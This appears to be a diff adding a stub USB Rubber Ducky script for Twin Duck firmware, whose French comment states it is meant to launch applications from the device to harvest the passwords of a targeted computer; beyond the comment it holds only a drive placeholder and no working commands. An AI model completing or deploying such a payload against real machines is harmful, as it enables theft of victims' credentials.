@@ -1,0 +1,3 @@
+REM Ce payload a pour but de lancer un certain nombre d'applications depuis la Twin Duck (USB Rubber Ducky avec Firmware Twin Duck) pour aspirer les mots de passe de l'ordinateur ciblé
+
+%sdrive%
